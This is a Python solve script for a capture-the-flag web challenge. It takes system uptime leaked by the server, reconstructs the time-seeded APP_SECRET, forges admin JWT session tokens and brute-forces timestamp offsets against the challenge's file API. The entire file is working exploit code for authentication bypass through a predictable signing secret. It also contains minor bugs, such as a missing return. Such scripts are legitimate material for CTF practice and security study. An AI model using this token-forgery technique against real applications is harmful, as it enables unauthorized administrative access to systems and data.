# CTF challenge by cyberjousting.com
# This code generates an admin JWT token to gain access to the web application.
# It retrieves the system uptime and estimates the creation time of APP_SECRET using time.time().

import jwt,sys
from datetime import datetime, timedelta
import hashlib, time, jwt, os
import requests

url = 'https://random.chal.cyberjousting.com/api/files'
# url = 'http://127.0.0.1:1337/api/files'

def send_session(jwt):
    
    headers = {'Cookie': f'session={jwt}'} 
    try:
        response = requests.get(url, headers=headers)
        print(response.status_code)

        if response.status_code != 403:
            print(response.status_code)
            print(response.text)
            return True
        else:
            False
    except requests.RequestException as e:
        print(e.message)

def send_request():

    
    headers = {'Cookie': 'session='}  # Empty session cookie

    try:
        response = requests.get(url, headers=headers)
        timenow = time.time()
        
        # Extract the text from the response
        response_text = response.text
        print(response_text) #

        # Extract the system uptime information
        uptime_start = 'This system has been up for '
        uptime_end = ' seconds fyi :wink:'
        uptime_index_start = response_text.find(uptime_start)
        uptime_index_end = response_text.find(uptime_end)
        
        if uptime_index_start != -1 and uptime_index_end != -1:
            uptime_text = response_text[uptime_index_start + len(uptime_start):uptime_index_end]
            uptime_seconds = int(uptime_text.strip())
            print("System uptime in seconds:", uptime_seconds)
            return timenow - uptime_seconds
        else:
            print("System uptime information not found in the response.")

    except requests.RequestException as e:
        print("Error:", e)


time_started = round(send_request())


def gen_jwt(time_diff):
    print("time check ", time_started + time_diff)
    APP_SECRET = hashlib.sha256(str(time_started + time_diff).encode()).hexdigest()
    # Example session data (you can replace this with your own data)
    session_data = {
        'userid': 0
    }

    # Encode the session data into a JWT
    encoded_session = jwt.encode(session_data, APP_SECRET, algorithm='HS256')

    print("Encoded JWT:", encoded_session.decode())
    return encoded_session.decode()

if len(sys.argv) > 1:
    time_know = int(sys.argv[1])
    APP_SECRET = hashlib.sha256(str(time_know).encode()).hexdigest()
    # Example session data (you can replace this with your own data)
    print(time_know)
    session_data = {
        'userid': 0  # Example user ID
        }

    # Encode the session data into a JWT
    encoded_session = jwt.encode(session_data, APP_SECRET, algorithm='HS256')

    print("Encoded JWT:", encoded_session)

    exit()

    
n = 200
jwt_token = gen_jwt(0)
if send_session(jwt_token) == True:
    exit()

for i in range(1, n + 1):
    jwt_token = gen_jwt(i)
    if send_session(jwt_token) == True:
        break

    jwt_token = gen_jwt(-i)
    if send_session(jwt_token) == True:
        break
    